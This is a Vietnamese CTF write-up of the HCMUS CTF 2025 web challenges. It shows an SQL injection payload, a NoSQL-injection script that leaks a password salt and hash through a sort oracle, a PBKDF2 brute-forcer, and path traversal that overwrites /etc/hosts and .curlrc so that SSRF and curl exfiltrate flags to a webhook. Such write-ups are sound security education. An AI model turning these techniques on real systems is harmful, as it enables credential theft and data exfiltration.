---
title: '[Writeup] - HCMUS CTF Quals (2025)'
description: "Đây là writeup của giải HCMUS CTF 2025"
tag: ['Writeup', 'Web', 'PWN']
top_img: /img/2025/hcmus-ctf/logo.png
cover: /img/2025/hcmus-ctf/logo.png
category: ['Writeup', 'HCMUS-CTF']
date: 2025-07-22 02:35:38
author:
    - d4kw1n
---

Đây là Writeup HCMUS CTF 2025 của team VSL.T1. Sau 2 ngày kết thúc cuộc thi, mình vừa rảnh rỗi thì quyết định viết ngắn gọn và đầy đủ hơn lại một Writeup về mảng Web và PWN của giải vì các challenge hay quá ^^. Rất cảm ơn btc và author đã vắt chất xám ra để tạo nên được những challenge này. orz

Mã nguồn của các challenge các bạn có thể tải ở đây: [Link](https://github.com/d4kw1n/ctf-storage/tree/main/2025/HCMUS-CTF-Qual)

# Web

## Web/AsiaCCS

![Description](/img/2025/hcmus-ctf/des1.png)

Challenge này được cung cấp mã nguồn. Mình review source thì phát hiện lỗ hổng SQL Injection ở trong hàm `query_by_affiliation()`.

![SQLi trong mã nguồn](/img/2025/hcmus-ctf/web1-1.png)

Đồng thời, flag cũng được lưu ở trong DB

![Flag trong DB](/img/2025/hcmus-ctf/web1-2.png)

⇒ Từ đây có thể đoán được bài này dùng SQLi để get được flag

Dùng payload: `%' UNION SELECT flag, flag, flag FROM flag -- -`

![PoC](/img/2025/hcmus-ctf/web1-3.png)

> Flag: `HCMUS-CTF{vibe-coding_more-jobs-for-pentesters!!}`

## Web/MAL

### Mô tả

![Mô tả](/img/2025/hcmus-ctf/des2.png)


### Phân tích

Đầu tiên, mình đi tìm xem thử `Flag` sẽ nằm ở đâu để tiện hơn trong việc tìm cách khai thác. Mình review source code thì nhận thấy chỉ có một nơi để đọc được `FLAG_1` là phải xem thông qua `/user/Dat2Phit/edit`, và flag sẽ là phần `secret`

```javascript
// app/routes/user.js
router.get('/user/:username/edit', isLoggedIn, async (req, res) => {
  const username = req.params.username;
  if (myCache.has(`user_${username}`)) {
    const user = myCache.get(`user_${username}`);
    if (user.data.username !== req.user.username) {
      throw new Error('No IDOR for u');
    }
    res.render('user/edituser', { data: user.data });
  } else {
    try {
      const existed_user = await jakanUsers.users(username, 'full');
      const user = await User.findByUsername(existed_user.data.username);
      if (!user) {
        throw new Error('No user exist');
      } 
      if (user.data.username !== req.user.username) {
        throw new Error('No IDOR for u');
      }
      myCache.set(`user_${username}`, user);
      res.render('user/edituser', { data: user.data });
    } catch (error) {
      throw new Error(error.message);
    }
  }
});
```

```javascript
    // app/utils/init.js
    await User.findOneAndUpdate(
      { username: username },
      { 'data.secret': process.env.FLAG_1 || 'HCMUS-CTF{fake-flag}' }
    );
```

```html
// app/views/user/edituser.ejs
            <div class="col-xl-6 col-lg-6 col-md-6 col-sm-6 col-12">
              <div class="form-group">
                <label for="secret">Secret key</label>
                <input
                  type="url"
                  class="form-control readonly-input"
                  id="secret"
                  name="secret"
                  value="<%= (data?.secret ? data?.secret : "") %>"
                  readonly
                />
              </div>
            </div>
```

Tiếp theo là những phát hiện mà mình dùng để làm bàn đạp cho việc khai thác challenge này.

1. Challenge này được cấp source code, phân tích source thì mình phát hiện đoạn code bên dưới cho phép người dùng có thể chỉnh sửa tất cả các trường dữ liệu của `User` (Ngoại trừ `secret`, `username` và `role`), đồng thời đây là nơi `NoSQLi` xuất hiện.

```javascript
router.post('/user/:username/edit', isLoggedIn, async (req, res) => {
  const username = req.params.username;
  let user;
  if (myCache.has(`user_${username}`)) {
    user = myCache.get(`user_${username}`);
    if (user.data.username !== req.user.username) {
      throw new Error('No IDOR for u');
    }
  } else {
    const existed_user = await jakanUsers.users(username, 'full');
    user = await User.findByUsername(existed_user.data.username);
    if (!user) {
      throw new Error('No user exist');
    }
    if (user.data.username !== req.user.username) {
      throw new Error('No IDOR for u');
    }
    myCache.set(`user_${username}`, user);
  }
  const userSecret = req.body.secret;
  delete req.body.secret;
  const s = JSON.stringify(req.body).toLowerCase();
  if (s.includes('secret') || s.includes('username') || s.includes('role')) {
    throw new Error("Can't change those fields");
  }
  await User.findOneAndUpdate({ username: user.data.username, 'data.secret': userSecret }, req.body);
  res.sendStatus(204);
});
```

2. Khi debug trên local, mình biết được là server sẽ dùng hai field `hash` và `salt` để check password.

![Salt và hash trong DB mongo khi debug Local](/img/2025/hcmus-ctf/web2-1.png)

3. Mình cũng tìm được 1 đoạn code dính lỗi `NoSQLi`, và cũng là nơi để kết hợp với 2 phát hiện trên để khai thác challenge này.

```javascript
router.get('/users', async (req, res) => {
  let limit = 24, skip = 0, sort = 'created_at';
  if (req.query.limit) limit = parseInt(req.query.limit);
  if (req.query.skip) skip = parseInt(req.query.skip);
  if (req.query.sort && typeof req.query.sort === 'string') sort = req.query.sort;
  const users = await User.find()
    .skip(skip)
    .limit(limit)
    .sort(sort)
    .select('data');
  res.render('community/users', { users });
});
```

Dựa vào đoạn code này, attacker có thể kiểm soát `sort` để sắp xếp data theo các field dữ liệu trong Schema `User`.

4. Password của tài khoản `Dat2Phit`  được tạo ngẫu nhiên từ 5 ký tự số

![Password được khởi tạo](/img/2025/hcmus-ctf/web2-2.png)

⇒ Dựa vào 4 phát hiện trên, mình nảy ra ý tưởng là dùng (1) để thay đổi trường dữ liệu `salt` và `hash` để leak từng ký tự thông qua việc dùng (3)  một cách phù hợp. Sau đó sẽ crack password với format đã biết ở (4).

### PoC

1. Tạo một tài khoản bất kỳ, ở đây của mình sẽ là `abc` 

![Tạo tài khoản](/img/2025/hcmus-ctf/web2-3.png)

2. Thay `username` và `cookie` lấy được vào script để tiến hành bruteforce `salt` và `hash` (Do lúc này đang còn thi nên chưa kịp viết script tối ưu tự động hóa @@)

```javascript
import requests


URL = "http://chall.blackpinker.com:33508"
wordlist = [i for i in "0123456789abcdefghijklmnopqrstuvwxyz"]

session = requests.Session()
cookies = {
    "session": "eyJmbGFzaCI6e30sInBhc3Nwb3J0Ijp7InVzZXIiOiJhYmMifX0=",
    "session.sig": "w062Oy4ByjwDE9XD8Y21B-csZqU"
}

# Viết lại script để tự động hóa quy trình register

salt = "" 
for index_salt in range(32):
    for i in range(len(wordlist)):
        data = {
            "data.fullname": "abc",
            "data.email": "",
            "data.phone": "",
            "data.website": "",
            "secret[$ne]": "null",
            "data.address.street": "",
            "data.address.city": "",
            "data.address.state": "",
            "data.address.zip": "",
            "salt": f"{salt}{wordlist[i]}"
        }
        
        res = session.post(f"{URL}/user/abc/edit", data=data, cookies=cookies, allow_redirects=False)
        res = session.get(f"{URL}/users?limit=1&sort=salt", cookies=cookies)    
        if "Throughout Heaven and Earth, I alone am the honored one" in res.text:
            if index_salt == 31:
                salt += wordlist[i]
                break
            salt += wordlist[i - 1]
            print(f"Found salt: {salt}")
            break
print(f"Final salt: {salt}")

hashed = "" 
for index_salt in range(64):
    for i in range(len(wordlist)):
        data = {
            "data.fullname": "abc",
            "data.email": "",
            "data.phone": "",
            "data.website": "",
            "secret[$ne]": "null",
            "data.address.street": "",
            "data.address.city": "",
            "data.address.state": "",
            "data.address.zip": "",
            "hash": f"{hashed}{wordlist[i]}"
        }
        
        res = session.post(f"{URL}/user/abc/edit", data=data, cookies=cookies, allow_redirects=False)
        res = session.get(f"{URL}/users?limit=1&sort=hash", cookies=cookies)    
        if "Throughout Heaven and Earth, I alone am the honored one" in res.text:
            if index_salt == 63:
                hashed += wordlist[i]
                break
                
            hashed += wordlist[i - 1]
            print(f"Found hashed: {hashed}")
            break
print(f"Final hash: {hashed}")
print(f"Final salt: {salt}")
```

![Kết quả script](/img/2025/hcmus-ctf/web2-4.png)

3. Sau khi tìm được `hash` và `salt` thì thay vào script sau được mình viết để crack password, do password được tạo từ 5 ký tự số.

```javascript
const crypto = require("crypto");

const salt = "78975b1b240f2428f0a22f28fea2a3d9";
const target_hash =
    "68ec5c255f82cdcf8d59ac8bc68715efe6a504c20078cbd204574d656ad97a14";

for (let i = 0; i <= 99999; i++) {
    const password = i.toString().padStart(5, "0");
    const hash = crypto
        .pbkdf2Sync(password, salt, 25000, 32, "sha256")
        .toString("hex");
    if (hash === target_hash) {
        console.log("Found password:", password);
        process.exit(0);
    }
    if (i % 1000 === 0) {
        console.log("Tried:", password);
    }
}
console.log("Password not found");
```

![Kết quả bruteforce password](/img/2025/hcmus-ctf/web2-5.png)

4. Lúc này mình lấy các thông tin leak được để đăng nhập.

```txt
username: Dat2Phit
password: 41425
```

Kết quả sau khi đăng nhập và truy cập vào trang `/user/Dat2Phit/edit`

![Trang edit profile của account Dat2Phit](/img/2025/hcmus-ctf/web2-6.png)

5. Lúc này, do còn cache được lưu nên dữ liệu được hiển thị sẽ là dữ liệu cũ được cache lưu. Để bypass thì chỉ cần đổi `username` trên url thành ký tự viết thường do server lưu cache có phân biệt hoa thường nhưng username được dùng để lấy dữ liệu thì lại không.

![Bypass Cache để lấy được flag](/img/2025/hcmus-ctf/web2-7.png)

> Flag: `HCMUS-CTF{D1d_y0u_u53_B1n4ry_s34rcH?:v}`

## Web/MALD

### Description

![Description](/img/2025/hcmus-ctf/des-web-mald.png)

Đây là bài thứ 2 trong series web, và nó dùng chung source với bài Web/MAL.

### Phân tích

Ở bài này thì nhiệm vụ là cần phải truy cập vào được url `/admin/flag`. Tuy nhiên, route này chỉ chấp nhận được truy cập từ `localhost` mới trả về flag. => Bắt buộc phải SSRF ở đây rồi

```javascript
router.post('/admin/archive/:filename', isAdmin, async (req, res) => {
  const filename = req.params.filename;
  const content = req.body.content;
  const file_path = path.join(archiveFolder, filename);
  if (
    file_path.includes('app') ||
    file_path.includes('proc') ||
    file_path.includes('environ') ||
    isBinaryPath(file_path)
  ) {
    throw new Error('Invalid path');
  }
  if (!isAscii(content)) {
    throw new Error('Content must be ASCII');
  }
  fs.writeFileSync(file_path, content);
  res.redirect(`/admin/archive/${filename}`);
});
```

Lúc này, mình chú ý đến đoạn code này. Nó sẽ cho phép người dùng admin (Dat2Phit mà mình đã lấy được từ challenge trước đó) để ghi nội dung vào một file nào đó. Ở đây, còn dính phải lỗi Path Traversal ở tham số `:filename` nên mình nghĩ đến việc tận dụng để ghi đè lại một file là `/etc/hosts`

Câu hỏi đặt ra là mình phải ghi đè thành host nào đây. Thì khi đọc writeup của tác giả thì mình mới biết được là trong source có call đến một URL `http://api.jikan.moe/v4/producers` (Ngồi gần 30 tiếng rồi nên khúc này không nghĩ tới được @@)

```javascript
router.get('/studio/:producerId', async (req, res) => {
  const mal_id = req.params.producerId;
  let data;
  if (myCache.has(`studio_${mal_id}`)) {
    data = myCache.get(`studio_${mal_id}`);
  } else {
    // The libray hasn't implemented a wrapper for producers
    const request = jakanMisc.infoRequestBuilder(
      'http://api.jikan.moe/v4/producers',
      mal_id,
      'full'
    );
    data = await jakanMisc.makeRequest(normalizeUrl(request));
    myCache.set(`studio_${mal_id}`, data);
  }
  res.render('producer/studio', {
    data: data.data
  });
});
```

=> Vậy là chỉ cần ghi đè `api.jikan.moe` thành 127.0.0.1 để rồi khi call đến api trên thì sẽ gọi đến localhost và lấy được flag được lưu trong cache.

Ở đây, còn có lỗi path traversal trong đoạn code dưới:

```javascript
const request = jakanMisc.infoRequestBuilder(
      'http://api.jikan.moe/v4/producers',
      mal_id,
      'full'
    );
```

```javascript
infoRequestBuilder(
    endpointBase: string,
    id: number | string,
    extraInfo?: string
): string {
    if (typeof extraInfo === "string") {
        return `${endpointBase}/${id}/${extraInfo}`;
    } else {
        return `${endpointBase}/${id}`;
    }
}
```

Tham số truyền vào không được sanitize kỹ nên sẽ là nơi được tận dụng để tạo thành chain khai thác

### PoC

1. Intended:

Đọc nội dung file /etc/hosts nhờ vào lỗi path traversal ở `/admin/archive/:filename`

![Content of /etc/hosts](/img/2025/hcmus-ctf/etc-hosts.png)

- Ghi thêm nội dung vào file `/etc/hosts`

```txt
POST /admin/archive/%2e%2e%2fetc%2fhosts HTTP/1.1
...

content=127.0.0.1%09localhost%0D%0A%3A%3A1%09localhost+ip6-localhost+ip6-loopback%0D%0Afe00%3A%3A%09ip6-localnet%0D%0Aff00%3A%3A%09ip6-mcastprefix%0D%0Aff02%3A%3A1%09ip6-allnodes%0D%0Aff02%3A%3A2%09ip6-allrouters%0D%0A172.19.0.3%09171089c0143d%0D%0Aapi.jikan.moe%09127.0.0.1
```

![Write to /etc/hosts](/img/2025/hcmus-ctf/write-file.png)

![New /etc/hosts](/img/2025/hcmus-ctf/new-etc-hosts.png)

- Khi ghi thành công vào `/etc/hosts`, tiếp tục đến việc tận dụng SSRF để đọc được flag ở `/admin/flag`

`GET /studio/%2e%2e%2f%2e%2e%2fadmin%2fflag%23 HTTP/1.1`

![SSRF](/img/2025/hcmus-ctf/result-web2.png)

- Đến đây thì chỉ cần truy cập vào cache của admin `/admin/cache` là có thể xem được flag 2 rồi.

![Get flag from cache](/img/2025/hcmus-ctf/flag2.png)

> Flag: `HCMUS-CTF{Sh0uldnt_h4v3_1mpl3m3nt3d_1t}`

2. Unintended:

- Dùng `~/.curl` để ghi đè lại cấu hình của config của `curl` rồi đọc file `/proc/1/environ` là lấy được cả 3 flag của 3 bài web. (Wow, kiến thức mới)

## Web/BALD

### Description

![Description](/img/2025/hcmus-ctf/des-web-bald.png)

### PoC

1. Mình dùng cách Unintended ở câu Web/MALD để solve luôn bài này được.

Ghi đè nội dung file /root/.curlrc

![Overwrite /root/.curlrc](/img/2025/hcmus-ctf/overwrite-curlrc.png)

![Result](/img/2025/hcmus-ctf/res-overwrite-curlrc.png)

Trong route `GET /user/:username/export` có sử dụng curl nên mình sẽ tận dụng nó để curl được gọi.

```javascript
// src\app\routes\user.js

router.get('/user/:username/export', isLoggedIn, async (req, res) => {
  const username = req.params.username;
  const baseURL = `http://localhost:${process.env.PORT}`;
  const data = await execFile('curl', [`${baseURL}/user/${username}/profile`]);
  console.log(data);
  const $ = cheerio.load(data.stdout);
  const imgs = $('img:not(.user-avatar)')
  console.log(`Found ${imgs.length} images`);
  console.log(imgs);
  const imgs_src = []
  imgs.each(function (idx, img) {
    imgs_src.push($(img).attr('src'))
  });
  console.log("Image sources:", imgs_src);
  const promises = imgs_src.map((src) =>
    execFile('curl', [src], { encoding: 'buffer', maxBuffer: 5 * 1024 * 1024 })
  );
  const results = await Promise.all(promises)
  const img_buffers = await Promise.all(
    results.map(async (res) => {
      const img = await sharp(res.stdout).toFormat('png').toBuffer();
      return img
    }
  ));
  const outFile = `${exportsFilePath}/${uuidv4()}.pdf`;
  const pdfBuffers = await imgToPDF(img_buffers, imgToPDF.sizes.A5).toArray()
  fs.writeFileSync(outFile, Buffer.concat(pdfBuffers));
  res.download(outFile, `${username}.pdf`, function (err) {
    if (err) {
      console.log(err);
    }
    fs.unlinkSync(outFile);
  });
});
```

Đến đây, chỉ cần truy cập vào `/user/DaT2PhIT/export` để curl được gọi và bùm, cả 3 flag sẽ được gửi qua webhook.

![Boom](/img/2025/hcmus-ctf/unintended-flag.png)

2. Cách Intended thì mình sẽ bổ sung sauu.
